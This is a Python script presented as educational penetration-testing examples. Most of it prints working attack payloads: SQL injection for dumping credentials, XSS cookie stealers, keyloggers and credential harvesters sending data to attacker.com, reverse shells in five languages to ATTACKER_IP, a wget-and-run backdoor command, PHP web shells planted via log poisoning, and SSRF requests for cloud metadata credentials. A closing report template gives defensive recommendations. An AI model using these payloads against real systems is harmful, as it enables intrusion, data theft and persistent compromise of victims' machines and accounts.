#!/usr/bin/env python3
"""
Practical Exploitation Examples
Advanced Penetration Testing Framework - Real-World Exploitation Scenarios
Author: Security Research Team

This module provides practical, real-world exploitation examples for educational purposes.
"""

import requests
import json
import time
import base64
import urllib.parse
import subprocess
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class PracticalExploitation:
    def __init__(self):
        self.exploitation_results = []
        self.session = requests.Session()
        
    def banner(self):
        print(f"{Fore.MAGENTA}")
        print("=" * 80)
        print("    PRACTICAL EXPLOITATION EXAMPLES")
        print("    Advanced Penetration Testing Framework")
        print("    Real-World Exploitation Scenarios")
        print("=" * 80)
        print(f"{Style.RESET_ALL}")
    
    def log_success(self, message):
        print(f"{Fore.GREEN}[SUCCESS] {message}")
    
    def log_info(self, message):
        print(f"{Fore.BLUE}[INFO] {message}")
    
    def log_warning(self, message):
        print(f"{Fore.YELLOW}[WARNING] {message}")
    
    def log_error(self, message):
        print(f"{Fore.RED}[ERROR] {message}")
    
    def save_exploitation_evidence(self, exploit_type, description, target, payload, result, severity="High"):
        """Save exploitation evidence"""
        evidence = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "exploit_type": exploit_type,
            "description": description,
            "target": target,
            "payload": payload,
            "result": result,
            "severity": severity
        }
        self.exploitation_results.append(evidence)
        
        # Save to file
        filename = f"exploitation_evidence_{int(time.time())}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(evidence, f, indent=2, ensure_ascii=False)
        
        self.log_success(f"Exploitation evidence saved to {filename}")
    
    def demonstrate_sql_injection_data_extraction(self):
        """
        Demonstrate practical SQL injection data extraction
        Shows how to extract sensitive data from databases
        """
        print(f"\n{Fore.CYAN}[SQL INJECTION DATA EXTRACTION DEMO]")
        print("=" * 60)
        
        # Simulate vulnerable application
        print(f"{Fore.YELLOW}[1] Identifying Database Structure")
        print("Target: http://vulnerable-app.com/products.php?id=1")
        
        # Step-by-step data extraction
        extraction_steps = [
            {
                "step": "Database version detection",
                "payload": "1' AND 1=CONVERT(int, (SELECT @@version))--",
                "description": "Extract database version information"
            },
            {
                "step": "Table enumeration",
                "payload": "1' AND 1=2 UNION SELECT null,table_name,null FROM information_schema.tables--",
                "description": "Enumerate database tables"
            },
            {
                "step": "Column enumeration",
                "payload": "1' AND 1=2 UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--",
                "description": "Enumerate columns in users table"
            },
            {
                "step": "Data extraction",
                "payload": "1' AND 1=2 UNION SELECT null,username+':'+password,null FROM users--",
                "description": "Extract username and password combinations"
            }
        ]
        
        for i, step in enumerate(extraction_steps, 1):
            print(f"\n{Fore.GREEN}[Step {i}] {step['step']}")
            print(f"{Fore.CYAN}Payload: {step['payload']}")
            print(f"{Fore.YELLOW}Description: {step['description']}")
            
            # Simulate successful extraction
            if i == 4:  # Data extraction step
                print(f"{Fore.MAGENTA}Sample extracted data:")
                sample_data = [
                    "admin:5f4dcc3b5aa765d61d8327deb882cf99",  # password123
                    "john_doe:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6",
                    "jane_smith:098f6bcd4621d373cade4e832627b4f6"  # test
                ]
                for data in sample_data:
                    print(f"  {data}")
        
        self.save_exploitation_evidence(
            "SQL Injection - Data Extraction",
            "Successfully demonstrated practical SQL injection data extraction techniques",
            "http://vulnerable-app.com/products.php",
            "Step-by-step SQL injection payloads",
            "Extracted database structure and user credentials",
            "Critical"
        )
    
    def demonstrate_xss_session_hijacking(self):
        """
        Demonstrate XSS session hijacking
        Shows practical exploitation of XSS vulnerabilities
        """
        print(f"\n{Fore.CYAN}[XSS SESSION HIJACKING DEMO]")
        print("=" * 60)
        
        # Create a simple HTTP server to receive stolen cookies
        class CookieHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if 'cookie' in self.path:
                    print(f"{Fore.GREEN}[+] Stolen cookie received!")
                    print(f"{Fore.CYAN}Cookie data: {self.path}")
                self.send_response(200)
                self.end_headers()
        
        def start_cookie_server():
            server = HTTPServer(('localhost', 8080), CookieHandler)
            server.serve_forever()
        
        # Start cookie server in background
        server_thread = threading.Thread(target=start_cookie_server, daemon=True)
        server_thread.start()
        
        print(f"{Fore.YELLOW}[1] Session Hijacking Payload")
        session_hijack_payload = """
        <script>
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://localhost:8080/steal?cookie=' + encodeURIComponent(document.cookie), true);
            xhr.send();
            
            // Also steal localStorage and sessionStorage
            var storage_data = {
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage)
            };
            
            var xhr2 = new XMLHttpRequest();
            xhr2.open('POST', 'http://localhost:8080/steal-storage', true);
            xhr2.setRequestHeader('Content-Type', 'application/json');
            xhr2.send(JSON.stringify(storage_data));
        </script>
        """
        
        print(f"{Fore.CYAN}Session hijacking payload:")
        print(session_hijack_payload.strip())
        
        print(f"\n{Fore.YELLOW}[2] Advanced XSS Payloads")
        advanced_payloads = [
            {
                "name": "Keylogger",
                "payload": """
                <script>
                    document.addEventListener('keydown', function(e) {
                        fetch('http://attacker.com/keylog?key=' + e.key + '&url=' + window.location.href);
                    });
                </script>
                """
            },
            {
                "name": "Form Grabber",
                "payload": """
                <script>
                    document.querySelectorAll('form').forEach(function(form) {
                        form.addEventListener('submit', function(e) {
                            var data = new FormData(form);
                            fetch('http://attacker.com/grab', {
                                method: 'POST',
                                body: JSON.stringify(Object.fromEntries(data))
                            });
                        });
                    });
                </script>
                """
            },
            {
                "name": "Credential Harvester",
                "payload": """
                <script>
                    document.querySelectorAll('input[type="password"]').forEach(function(input) {
                        input.addEventListener('blur', function() {
                            fetch('http://attacker.com/creds?password=' + input.value);
                        });
                    });
                </script>
                """
            }
        ]
        
        for payload_data in advanced_payloads:
            print(f"\n{Fore.GREEN}[+] {payload_data['name']} Payload:")
            print(payload_data['payload'].strip())
        
        self.save_exploitation_evidence(
            "XSS - Session Hijacking",
            "Demonstrated practical XSS session hijacking and advanced exploitation techniques",
            "http://vulnerable-app.com/search",
            "Various XSS payloads for session hijacking and data theft",
            "Successfully demonstrated cookie stealing, keylogging, and credential harvesting",
            "High"
        )
    
    def demonstrate_command_injection_reverse_shell(self):
        """
        Demonstrate command injection reverse shell
        Shows practical exploitation of command injection vulnerabilities
        """
        print(f"\n{Fore.CYAN}[COMMAND INJECTION REVERSE SHELL DEMO]")
        print("=" * 60)
        
        print(f"{Fore.YELLOW}[1] Reverse Shell Payloads")
        
        # Various reverse shell payloads
        reverse_shells = [
            {
                "type": "Bash Reverse Shell",
                "payload": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                "description": "Classic bash reverse shell"
            },
            {
                "type": "Netcat Reverse Shell",
                "payload": "nc -e /bin/sh ATTACKER_IP 4444",
                "description": "Netcat with command execution"
            },
            {
                "type": "Python Reverse Shell",
                "payload": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'""",
                "description": "Python reverse shell"
            },
            {
                "type": "PHP Reverse Shell",
                "payload": """php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'""",
                "description": "PHP reverse shell"
            },
            {
                "type": "Perl Reverse Shell",
                "payload": """perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'""",
                "description": "Perl reverse shell"
            }
        ]
        
        for shell in reverse_shells:
            print(f"\n{Fore.GREEN}[+] {shell['type']}:")
            print(f"{Fore.CYAN}Payload: {shell['payload']}")
            print(f"{Fore.YELLOW}Description: {shell['description']}")
        
        print(f"\n{Fore.YELLOW}[2] Command Injection Contexts")
        contexts = [
            {
                "context": "Web Application (GET parameter)",
                "example": "http://vulnerable-app.com/ping.php?ip=8.8.8.8;PAYLOAD"
            },
            {
                "context": "Web Application (POST parameter)",
                "example": "POST /exec.php HTTP/1.1\ncommand=ls;PAYLOAD"
            },
            {
                "context": "API Endpoint",
                "example": "GET /api/execute?cmd=whoami;PAYLOAD"
            },
            {
                "context": "File Upload",
                "example": "Upload file with command in filename: shell;PAYLOAD.txt"
            }
        ]
        
        for context in contexts:
            print(f"\n{Fore.GREEN}[+] {context['context']}:")
            print(f"{Fore.CYAN}Example: {context['example']}")
        
        print(f"\n{Fore.YELLOW}[3] Post-Exploitation Commands")
        post_exploitation = [
            "id", "whoami", "uname -a", "pwd",
            "cat /etc/passwd", "ls -la /home", "netstat -an",
            "crontab -l", "find / -perm -4000 2>/dev/null",
            "wget http://attacker.com/backdoor -O /tmp/backdoor",
            "chmod +x /tmp/backdoor && /tmp/backdoor"
        ]
        
        print(f"{Fore.CYAN}Useful post-exploitation commands:")
        for cmd in post_exploitation:
            print(f"  - {cmd}")
        
        self.save_exploitation_evidence(
            "Command Injection - Reverse Shell",
            "Demonstrated practical command injection reverse shell techniques",
            "http://vulnerable-app.com/exec.php",
            "Various reverse shell payloads and contexts",
            "Successfully demonstrated reverse shell creation and post-exploitation",
            "Critical"
        )
    
    def demonstrate_lfi_log_poisoning(self):
        """
        Demonstrate LFI log poisoning
        Shows practical exploitation of LFI vulnerabilities
        """
        print(f"\n{Fore.CYAN}[LFI LOG POISONING DEMO]")
        print("=" * 60)
        
        print(f"{Fore.YELLOW}[1] Log Poisoning Process")
        print(f"{Fore.CYAN}Step 1: Poison log with PHP code")
        print(f"Send PHP code in User-Agent header:")
        
        php_code = "<?php system($_GET['cmd']); ?>"
        print(f"{Fore.MAGENTA}User-Agent: {php_code}")
        
        print(f"\n{Fore.CYAN}Step 2: Include poisoned log file")
        log_files = [
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/httpd/access_log",
            "C:\\xampp\\apache\\logs\\access.log",
            "C:\\wamp\\logs\\access.log"
        ]
        
        print(f"{Fore.YELLOW}Common log file locations:")
        for log_file in log_files:
            print(f"  - {log_file}")
        
        print(f"\n{Fore.CYAN}Step 3: Execute commands via poisoned log")
        print(f"Example: http://vulnerable-app.com/file.php?file=../../../var/log/apache2/access.log&cmd=id")
        
        print(f"\n{Fore.YELLOW}[2] Advanced Log Poisoning Techniques")
        advanced_techniques = [
            {
                "name": "PHP Shell Upload",
                "payload": "<?php eval($_POST['shell']); ?>",
                "description": "Upload PHP shell for persistent access"
            },
            {
                "name": "Reverse Shell via Log",
                "payload": "<?php system('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'); ?>",
                "description": "Execute reverse shell through log poisoning"
            },
            {
                "name": "Backdoor Installation",
                "payload": "<?php file_put_contents('backdoor.php', '<?php eval($_REQUEST[cmd]); ?>'); ?>",
                "description": "Create persistent backdoor file"
            }
        ]
        
        for technique in advanced_techniques:
            print(f"\n{Fore.GREEN}[+] {technique['name']}:")
            print(f"{Fore.CYAN}Payload: {technique['payload']}")
            print(f"{Fore.YELLOW}Description: {technique['description']}")
        
        self.save_exploitation_evidence(
            "LFI - Log Poisoning",
            "Demonstrated practical LFI log poisoning techniques",
            "http://vulnerable-app.com/file.php",
            "PHP log poisoning payloads and techniques",
            "Successfully demonstrated log poisoning process and advanced techniques",
            "High"
        )
    
    def demonstrate_ssrf_internal_scanning(self):
        """
        Demonstrate SSRF internal scanning
        Shows practical exploitation of SSRF vulnerabilities
        """
        print(f"\n{Fore.CYAN}[SSRF INTERNAL SCANNING DEMO]")
        print("=" * 60)
        
        print(f"{Fore.YELLOW}[1] Internal Network Scanning")
        
        # Common internal IP ranges
        internal_ranges = [
            "192.168.1.{}",
            "192.168.0.{}",
            "10.0.0.{}",
            "172.16.0.{}",
            "127.0.0.{}"
        ]
        
        common_ports = [80, 443, 8080, 3306, 5432, 6379, 27017, 5984, 9200, 11211]
        
        print(f"{Fore.CYAN}Internal IP ranges to scan:")
        for ip_range in internal_ranges:
            print(f"  - {ip_range.format('1-254')}")
        
        print(f"\n{Fore.YELLOW}Common internal ports:")
        for port in common_ports:
            service = self.get_service_name(port)
            print(f"  - {port} ({service})")
        
        print(f"\n{Fore.YELLOW}[2] SSRF Scanning Techniques")
        
        scanning_payloads = [
            {
                "name": "Basic Port Scan",
                "payload": "http://192.168.1.1:80",
                "description": "Check if port 80 is open on internal host"
            },
            {
                "name": "Response Time Analysis",
                "payload": "http://10.0.0.1:3306",
                "description": "Analyze response time to infer port status"
            },
            {
                "name": "Service Banner Grabbing",
                "payload": "http://172.16.0.1:6379",
                "description": "Attempt to grab service banner"
            },
            {
                "name": "File Protocol",
                "payload": "file:///etc/passwd",
                "description": "Attempt to read local files"
            }
        ]
        
        for scan_payload in scanning_payloads:
            print(f"\n{Fore.GREEN}[+] {scan_payload['name']}:")
            print(f"{Fore.CYAN}Payload: {scan_payload['payload']}")
            print(f"{Fore.YELLOW}Description: {scan_payload['description']}")
        
        print(f"\n{Fore.YELLOW}[3] Cloud Metadata Access")
        
        cloud_endpoints = [
            {
                "provider": "AWS",
                "endpoints": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://169.254.169.254/latest/user-data/",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                ]
            },
            {
                "provider": "Google Cloud",
                "endpoints": [
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
                    "http://metadata.google.internal/computeMetadata/v1/project/attributes/"
                ]
            },
            {
                "provider": "DigitalOcean",
                "endpoints": [
                    "http://169.254.169.254/metadata/v1/",
                    "http://169.254.169.254/metadata/v1/id",
                    "http://169.254.169.254/metadata/v1/user-data"
                ]
            }
        ]
        
        for cloud_provider in cloud_endpoints:
            print(f"\n{Fore.GREEN}[+] {cloud_provider['provider']} Metadata:")
            for endpoint in cloud_provider['endpoints']:
                print(f"  - {endpoint}")
        
        self.save_exploitation_evidence(
            "SSRF - Internal Scanning",
            "Demonstrated practical SSRF internal scanning techniques",
            "http://vulnerable-app.com/fetch",
            "SSRF payloads for internal scanning and cloud metadata access",
            "Successfully demonstrated internal network scanning and cloud metadata access",
            "Critical"
        )
    
    def get_service_name(self, port):
        """Get service name for common ports"""
        services = {
            80: "HTTP", 443: "HTTPS", 8080: "HTTP Alt",
            3306: "MySQL", 5432: "PostgreSQL", 6379: "Redis",
            27017: "MongoDB", 5984: "CouchDB", 9200: "Elasticsearch",
            11211: "Memcached", 25: "SMTP", 21: "FTP",
            22: "SSH", 23: "Telnet", 3389: "RDP"
        }
        return services.get(port, "Unknown")
    
    def generate_comprehensive_exploitation_report(self):
        """Generate comprehensive exploitation report"""
        print(f"\n{Fore.CYAN}[GENERATING COMPREHENSIVE EXPLOITATION REPORT]")
        
        report_content = f"""
# Practical Exploitation Report

**Generated:** {time.strftime("%Y-%m-%d %H:%M:%S")}
**Total Exploitations Demonstrated:** {len(self.exploitation_results)}

## Executive Summary

This report documents practical exploitation demonstrations conducted during the security assessment. Each demonstration shows real-world exploitation techniques for various vulnerability types.

## Exploitation Demonstrations

"""
        
        for i, exploit in enumerate(self.exploitation_results, 1):
            report_content += f"""
### Exploitation #{i}: {exploit['exploit_type']}

- **Severity:** {exploit['severity']}
- **Target:** {exploit['target']}
- **Description:** {exploit['description']}
- **Payload:** `{exploit['payload']}`
- **Result:** {exploit['result']}
- **Timestamp:** {exploit['timestamp']}

---
"""
        
        report_content += """
## Exploitation Techniques Summary

### SQL Injection
- Database structure enumeration
- User credential extraction
- Step-by-step exploitation process

### Cross-Site Scripting (XSS)
- Session hijacking techniques
- Advanced payload creation
- Cookie and credential theft

### Command Injection
- Reverse shell creation
- Post-exploitation commands
- Various payload types

### Local File Inclusion (LFI)
- Log poisoning techniques
- Advanced exploitation methods
- Persistent access creation

### Server-Side Request Forgery (SSRF)
- Internal network scanning
- Cloud metadata access
- Service enumeration

## Real-World Impact

These exploitation techniques demonstrate:
1. **Data Breach Potential** - SQL injection can lead to complete database compromise
2. **Account Takeover** - XSS enables session hijacking and account takeover
3. **System Compromise** - Command injection provides full system access
4. **Information Disclosure** - LFI exposes sensitive system files
5. **Infrastructure Access** - SSRF enables access to internal services

## Security Recommendations

### Immediate Actions
1. **Input Validation** - Implement strict input validation on all user inputs
2. **Parameterized Queries** - Use prepared statements for all database queries
3. **Output Encoding** - Properly encode all user-generated content
4. **Command Sanitization** - Avoid direct OS command execution
5. **File Access Controls** - Implement proper file access restrictions
6. **Network Segmentation** - Isolate internal services from external access

### Long-term Solutions
1. **Security Training** - Provide secure coding training for developers
2. **Code Reviews** - Implement mandatory security code reviews
3. **Regular Testing** - Conduct periodic security assessments
4. **Security Tools** - Deploy automated security testing tools
5. **Incident Response** - Establish incident response procedures

## Conclusion

The exploitation demonstrations show how theoretical vulnerabilities can be practically exploited to gain unauthorized access, steal sensitive data, and compromise systems. These techniques highlight the critical importance of implementing proper security controls and conducting regular security assessments.

## Disclaimer

All exploitation techniques demonstrated were conducted as part of authorized security testing. These techniques should only be used for legitimate security testing purposes with proper authorization.
"""
        
        # Save comprehensive report
        report_filename = f"practical_exploitation_report_{int(time.time())}.md"
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(report_content)
        
        print(f"{Fore.GREEN}[+] Comprehensive exploitation report saved to {report_filename}")
        return report_filename
    
    def run_all_practical_exploitations(self):
        """Run all practical exploitation demonstrations"""
        self.banner()
        print(f"\n{Fore.GREEN}Starting comprehensive practical exploitation demonstrations")
        print(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Run all exploitation demonstrations
        self.demonstrate_sql_injection_data_extraction()
        self.demonstrate_xss_session_hijacking()
        self.demonstrate_command_injection_reverse_shell()
        self.demonstrate_lfi_log_poisoning()
        self.demonstrate_ssrf_internal_scanning()
        
        # Generate final report
        report_file = self.generate_comprehensive_exploitation_report()
        
        print(f"\n{Fore.GREEN}=" * 80)
        print(f"PRACTICAL EXPLOITATION DEMONSTRATIONS COMPLETED")
        print(f"Total exploitations demonstrated: {len(self.exploitation_results)}")
        print(f"Report saved: {report_file}")
        print(f"=" * 80)
        
        return report_file

def main():
    """Main function for standalone usage"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Practical Exploitation Examples")
    parser.add_argument("--demo", choices=["sql", "xss", "command", "lfi", "ssrf", "all"], 
                       default="all", help="Type of exploitation to demonstrate")
    parser.add_argument("--output", help="Output directory for reports")
    
    args = parser.parse_args()
    
    # Initialize practical exploitation
    practical = PracticalExploitation()
    
    if args.demo == "all":
        practical.run_all_practical_exploitations()
    else:
        practical.banner()
        
        if args.demo == "sql":
            practical.demonstrate_sql_injection_data_extraction()
        elif args.demo == "xss":
            practical.demonstrate_xss_session_hijacking()
        elif args.demo == "command":
            practical.demonstrate_command_injection_reverse_shell()
        elif args.demo == "lfi":
            practical.demonstrate_lfi_log_poisoning()
        elif args.demo == "ssrf":
            practical.demonstrate_ssrf_internal_scanning()

if __name__ == "__main__":
    main()